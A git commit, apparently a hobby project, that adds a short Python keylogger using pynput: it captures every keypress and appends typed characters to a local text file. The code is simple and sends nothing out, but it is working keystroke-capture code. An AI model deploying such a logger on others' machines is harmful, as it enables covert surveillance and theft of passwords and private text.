3ff7e36c3cfef8c53467b712efb1e608d42b2257
Federico <133919977+FedericoCWW@users.noreply.github.com>
2024-07-05 15:05:07 -0300

    Launch

---
+++ main.py
@@ -0,0 +1,17 @@
+from pynput import keyboard
+
+def K_pressed(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as LogKey:
+        try:
+            char = key.char
+            LogKey.write(char)
+        except AttributeError:
+            print('special key {0} pressed'.format(key))
+
+
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=K_pressed)
+    listener.start()
+    input()
